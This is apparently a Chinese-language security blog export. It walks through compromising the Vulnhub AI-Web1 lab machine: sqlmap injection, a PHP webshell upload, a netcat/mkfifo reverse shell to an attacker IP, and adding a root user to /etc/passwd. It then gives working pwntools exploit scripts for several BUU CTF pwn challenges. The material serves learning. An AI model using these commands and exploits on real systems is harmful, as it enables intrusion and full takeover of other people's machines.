<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255089.png" alt="image-20241119195241615" style="zoom:50%;" />

<p>使用<code>sqlmap</code>工具进行<code>sql</code>注入</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=11&amp;Operation=Submit&quot;</span> --dbs</span><br><span class="line"><span class="comment">#列出全部数据库</span></span><br><span class="line"><span class="comment">#aiweb1,information_schema</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255859.png" alt="image-20241119200926142" style="zoom: 67%;" />

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 --tables</span><br><span class="line"><span class="comment">#列表</span></span><br><span class="line"><span class="comment">#user,systemUser</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255399.png" alt="image-20241119200941269" style="zoom: 67%;" />

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -T user --columns</span><br><span class="line"><span class="comment">#列字段</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -T user --columns -dump</span><br><span class="line"><span class="comment">#再加一个参数 -dump 可以把字段里的内容也列出来，或者不加--columns，只列字段里的内容</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255528.png" alt="image-20241119201916635" style="zoom:50%;" />

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D  aiweb1 -T systemUser -dump</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255163.png" alt="image-20241119202638863" style="zoom:50%;" />

<p>尝试<code>--os-shell</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> --os-shell</span><br><span class="line"><span class="comment">#/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255054.png" alt="image-20241119203738412" style="zoom:50%;" />

<p>第一个选<code>4(PHP)</code>，第二个选项选<code>2</code>(自定义目录位置)，这里需要提供绝对路径</p>
<p>​	<strong>前面在<code>php</code>配置文件中我们找到了网站的绝对路径为<code>/home/www/html/web1x443290o2sdf92213/</code>，扫描<code>/se3reTdir777/</code>目录时，出现了<code>/se3reTdir777/index.php</code>和<code>/se3reTdir777/uploads/</code>两个路径，访问这两个路径都存在<code>sql</code>注入漏洞，所以这里我两个路径都尝试了一下，<code>uploads/</code>这个对了。</strong></p>
<p>拿到<code>shell</code>，但是权限较低是<code>www-data</code></p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p><code>hack.php</code>，本地的一句话木马文件</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255275.png" alt="image-20241119210831951"></p>
<p>使用<code>sqlmap</code>上传<code>hack.php</code>文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.30.132/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> --file-write ./hack.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/hack.php</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>--file-read</code>：从后端<code>DBMS</code>文件系统读取文件</strong></li>
<li><strong><code>--file-write</code>：在后端<code>DBMS</code>文件系统上写入本地文件</strong></li>
<li><strong><code>--file-dest</code>：要写入的文件在<code>DBMS</code>上的绝对路径</strong></li>
</ul>
<p>然后使用蚁剑连接</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255001.png" alt="image-20241119210041331" style="zoom:50%;" />

<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹<code>shell</code></h3><p>在<code>kali</code>本地监听 <code>nc -lvvp 6666</code></p>
<p>在蚁剑虚拟终端上<code>nc</code>反弹，发现参数<code>-e</code>不可用</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.30.130 6666</span><br><span class="line"><span class="comment">#192.168.30.130是kali的IP地址</span></span><br></pre></td></tr></table></figure>

<p>在蚁剑终端上创建反向<code>shell</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc 192.168.30.130 6666 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>mkfifo /tmp/f</code>：创建一个命令管道(<code>FIFO</code>)，命名为<code>/tmp/f</code>。命名管道允许进程间的通信。</strong></li>
<li><strong><code>cat /tmp/f</code>：读取<code>/tmp/f</code>文件的内容。由于<code>/tmp/f</code>是一个命名管道，这个命令会等待数据被写入管道。</strong></li>
<li><strong><code>/bin/sh -i</code>：启动一个交互式的<code>shell</code>。<code>-i</code>参数表示交互式模式。</strong></li>
<li><strong><code>2&gt;&amp;1</code>：将标准错误(<code>stderr</code>)重定向到标准输出(<code>stdout</code>)。这意味着所有通过<code>shell</code>产生的错误消息也会被发送到同一个输出。</strong></li>
<li><strong><code>| nc 192.168.30.130 6666</code>：将<code>cat</code>命令的输出(即<code>shell</code>的输入)过管道传递给 <code>nc</code>(<code>netcat</code>)命令。<code>nc</code>命令连接到 IP 地址 <code>192.168.0.103</code>的<code>6666</code>端口，并将数据发送到该端口。</strong></li>
<li><strong><code>&gt;/tmp/f</code>：将<code>nc</code>命令的输出重定向到<code>/tmp/f</code>文件。这样，<code>cat /tmp/f</code>命令就会读取这些数据，并将其作为输入传递给<code>/bin/sh -i</code>，从而允许远程用户通过<code>nc</code>发送的命令来控制<code>shell</code>。</strong></li>
</ul>
<p>成功反弹<code>shell</code>，但依旧权限较低</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112255431.png" alt="image-20241119214828802" style="zoom:67%;" />

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>进入交互式<code>shell</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p>搜索属于<code>root</code>用户且具有<code>setuid</code>权限位的文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line"><span class="comment">#指定起始目录为根目录、搜索的文件所有者为root用户、查找具有setuid位的文件。(setuid权限位允许用户以文件所有者的权限执行文件，通常用于提升权限)</span></span><br><span class="line"><span class="comment"># -print：表示将搜索结果打印到标准输出。</span></span><br><span class="line"><span class="comment"># 2&gt;/dev/null：将错误消息重定向到 /dev/null，这意味着忽略所有错误信息。</span></span><br></pre></td></tr></table></figure>

<p>查看内核版本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112256673.png" alt="image-20241119221024659"></p>
<h4 id="添加root账号"><a href="#添加root账号" class="headerlink" title="添加root账号"></a>添加<code>root</code>账号</h4><p> 生成<code>Linux</code>系统用户密钥</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt jt 5799</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112256383.png" alt="image-20241119222550002"  />

<p> 读写<code>/etc/passwd</code>文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;jt:$1$jt$iCU3U.0M3WJQhDq5RlET00:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<p>登录账号</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">su jt</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112256265.png" alt="image-20241119222807809" style="zoom: 50%;" />

<h3 id="查看flag"><a href="#查看flag" class="headerlink" title="查看flag"></a>查看<code>flag</code></h3><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503112256776.png" alt="image-20241119222927834" style="zoom:50%;" />

<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>[看完这篇 教你玩转渗透测试靶机vulnhub——Ai-Web1](<a href="https://blog.csdn.net/Aluxian_/article/details/124434294">看完这篇 教你玩转渗透测试靶机vulnhub——Ai-Web1-CSDN博客</a>)</p>
<p>[Vulnhub靶机渗透之 AI: Web: 1](<a href="https://blog.csdn.net/Waffle666/article/details/118962742">Vulnhub靶机渗透之 AI: Web: 1_反弹shell服务器上执行不了ai:web:1-CSDN博客</a>)</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU刷题记录</title>
    <url>/2024/01/06/BUU%E5%88%B7%E9%A2%98/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>还是buu刷题记录，不过这个记录的题目都是让我学到的内容更多的题，值对一篇单独的文章。</p>
<p>[]<del>(￣▽￣)</del>*</p>
<span id="more"></span>

<h1 id="fini-arry-ciscn-2019-sw-1"><a href="#fini-arry-ciscn-2019-sw-1" class="headerlink" title="(fini.arry)ciscn_2019_sw_1"></a><code>(fini.arry)ciscn_2019_sw_1</code></h1><h2 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101102700.png" alt="image-20240710110220628" style="zoom:67%;" />

<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my ctf! What&#x27;s your name?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>​	程序中有一个格式化字符串漏洞，但只能执行一次格式化漏洞函数，有<code>system</code>函数。我们可以看到<code>printf(format)</code>后面<code>main</code>函数就执行完了，所以不管我们修改哪一个函数的<code>got</code>表值为<code>system@plt</code>的地址，都不行。后来看<code>wp</code>，发现我们可以修改<code>fini_array</code>的函数指针为<code>main</code>函数地址，这样就能再执行一次<code>main</code>函数了。</p>
<p>​	刚开始用下面这个方法，泄漏我们输入的第一个参数在栈中的偏移量，以为是<code>4</code>，一直打不通，调试的时候查看栈中的值，发现栈中的第<code>1,2</code>和<code>5</code>个参数都是我们输入的第一个参数，所以我们并不能确定准确的偏移量</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053168.png" alt="image-20240305185357092"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101102943.png" alt="image-20240710110200865"></p>
<p>​	然后我发送下面这个<code>payload</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;aaaabbbb&#x27;</span>+<span class="string">b&#x27;%p%p%p%p%p&#x27;</span></span><br></pre></td></tr></table></figure>

<p>​	现在可以看出泄漏的第<code>1</code>个参数地址是栈中的第<code>2</code>个参数，也就是说我们计算偏移量的时候要从<code>02</code>这个序号开始往下数</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053159.png" alt="image-20240305185704092"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./sw1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26399</span>)</span><br><span class="line"><span class="comment">#debug(p,0x80485A8)</span></span><br><span class="line"><span class="comment">#context.arch=&#x27;i386&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./sw1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x08048534</span></span><br><span class="line">fini_array_addr = <span class="number">0x0804979C</span></span><br><span class="line">printf_got = <span class="number">0x0804989c</span></span><br><span class="line">sys_plt = <span class="number">0x080483d0</span></span><br><span class="line"></span><br><span class="line">payload = p32(printf_got+<span class="number">2</span>)+p32(printf_got)+p32(fini_array_addr)</span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x804</span>-<span class="number">12</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%4$hn&#x27;</span></span><br><span class="line"><span class="comment">#这里还要减去12，因为前面发送的3个地址一共12个字节</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x83d0</span>-<span class="number">0x804</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%5$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x8534</span>-<span class="number">0x83d0</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101101049.png" alt="image-20240710110144974"></p>
<h1 id="qctf-2018-dice-game"><a href="#qctf-2018-dice-game" class="headerlink" title="qctf_2018_dice_game"></a><code>qctf_2018_dice_game</code></h1><p>​	分析程序，猜随机数，猜对了就能拿到<code>flag</code>。本题有两种方法，一种是利用溢出覆盖<code>seed</code>的值，然后使其为定值，这样我们就能拿到<code>50</code>个随机数，然后发送。第<code>2</code>种方法是自己起一个生成随机数的程序，在生成随机数的同时发送随机数，同样也能得到<code>flag</code>。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053468.png" alt="image-20240306124511429" style="zoom:80%;" />

<h2 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h2><p>​	先说第<code>1</code>种，程序中第<code>13</code>行有一个溢出点，<code>read</code>读入<code>0x50</code>个字节到<code>buf</code>中，可以算出<code>buf</code>距离<code>seed</code>的偏移量为<code>0x40</code>。也就是说我们可以覆盖<code>seed</code>，使其为定值，注意这里覆盖要在<code>seed = time(0LL)</code>之后。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053695.png" alt="image-20240306131031947" style="zoom:80%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>​	此时已经覆盖<code>seed</code>为<code>0</code>，然后写一个<code>c</code>语言程序打印出种子<code>seed</code>为<code>0</code>时，生成的前<code>50</code>个随机数，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    srand(<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,v2);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101101669.png" alt="image-20240710110124591"></p>
<p>最后<code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./q&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28649</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">v2=<span class="string">&quot;25426251423232651155634433322261116425254446323361&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v2:</span><br><span class="line">    p.sendline(i)</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h2><p>​	这一种方法是最常见的，也是最容易想到的，就是自己起一个生成随机数的程序，在生成随机数的同时发送随机数，同样也能得到<code>flag</code>。</p>
<p>生成随机数的<code>c</code>程序<code>rand.c</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> seed[<span class="number">2</span>];</span><br><span class="line">    *seed = time(<span class="number">0LL</span>);</span><br><span class="line">    srand(seed[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">int</span> v2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)&#123;</span><br><span class="line">    v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;======&gt;&gt;&gt;%d\n&quot;</span>,v2);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>exp</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#debug(p,&quot;pie&quot;,0x0000000000000C44)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./q&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28649</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;ome, let me know your name:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">a = process(<span class="string">&quot;./rand&quot;</span>)</span><br><span class="line">         </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):     </span><br><span class="line">    a.recvuntil(<span class="string">&quot;==&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">    value = a.recvline(<span class="literal">False</span>).decode()  </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;me the point(1~6): &quot;</span>,<span class="built_in">str</span>(value))</span><br><span class="line">    value = <span class="number">0</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053805.png" alt="image-20240306133033057"></p>
<h1 id="canary-linkctf-2018-7-babypie"><a href="#canary-linkctf-2018-7-babypie" class="headerlink" title="(canary)linkctf_2018.7_babypie"></a><code>(canary)linkctf_2018.7_babypie</code></h1><h2 id="保护-源码-1"><a href="#保护-源码-1" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101101413.png" alt="image-20240710110101339" style="zoom:67%;" />

<p>源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_960</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">5</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s:\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_A3E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>​	程序中直接给了后门函数，可以栈溢出，首先整体思路就是覆盖<code>main</code>函数返回地址为后门函数地址。但是开了<code>canary</code>和<code>PIE</code>保护，所以我们接下来要看看是否能绕过这两个保护。</p>
<p>​	首先是<code>PIE</code>保护，我们可以看到后门函数地址与原先地址只有最后<code>1</code>个字节不同，所以我们可以只覆盖返回地址的最后一、<code>1</code>个字节，进而控制执行流执行后门函数。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053191.png" alt="image-20240309162057963" style="zoom:67%;" />

<p>​	下面图中，<code>printf</code>可以打印出<code>buf</code>的地址里的字符串，正常来讲是不会输出<code>canary</code>的，因为<code>canary</code>的最后<code>1</code>个字节是<code>\x00</code>标志着字符串的结束，但是如果可以覆盖<code>\x00</code>，<code>canary</code>便会被连带着打印出来。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101100759.png" alt="image-20240710110038682"></p>
<p><code>read</code>可以读入<code>64</code>个字节，覆盖<code>canary</code>最后<code>1</code>个字节<code>\x00</code>只需要<code>41</code>个字节即可</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053220.png" alt="屏幕截图 2024-03-09 170006"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Input your Name:\n&quot;</span>,payload)</span><br></pre></td></tr></table></figure>

<p>覆盖后，如图：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101100880.png" alt="image-20240710110019800"></p>
<p>此时，<code>canary</code>便可被输出，接收<code>canary</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#这里不用ljust而是用rjust，ljust会把\x00补到高字节，而rjust会把\x00补到低字节</span></span><br></pre></td></tr></table></figure>

<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,elf,libc = load(<span class="string">&quot;babypie&quot;</span>,<span class="string">&quot;node5.buuoj.cn:26795&quot;</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Input your Name:\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;canary&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+p64(<span class="number">0</span>)+<span class="string">b&#x27;\x3f&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053917.png" alt="image-20240309212604335"></p>
<h1 id="交换变量值-pwnable-loveletter"><a href="#交换变量值-pwnable-loveletter" class="headerlink" title="(交换变量值)pwnable_loveletter"></a><code>(交换变量值)pwnable_loveletter</code></h1><h2 id="保护-源码-2"><a href="#保护-源码-2" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101059447.png" alt="image-20240710105958363" style="zoom:80%;" />

<p>源码：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053109.png" alt="image-20240318121511252" style="zoom:80%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101053124.png" alt="image-20240318121436189" style="zoom:50%;" />

<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>​	最开始以为程序中没有栈溢出，思路是用逻辑运算符分隔字符串执行<code>/bin/sh</code>或者其他命令，但是看到会被<code>protect</code>函数过滤。</p>
<p>​	然后也是在这个函数中，我们发现替换后的内容比替换前多了<code>3</code>个字节，可以造成栈溢出。控制<code>v6</code>这个值为<code>1</code>，就会把<code>prolog=&quot;echo I love &quot;</code>中的第一个字节拼接到<code>loveletter</code>中。然后我们直接写进<code>nv sh -c sh </code>拼接即可，注意这里要在最后留一个空格，因为后面还会在被拼接数据。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;nv sh -c sh&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">253</span>-<span class="number">11</span>)+<span class="string">b&#x27;;&#x27;</span>+<span class="string">b&#x27;\x01&#x27;</span></span><br></pre></td></tr></table></figure>

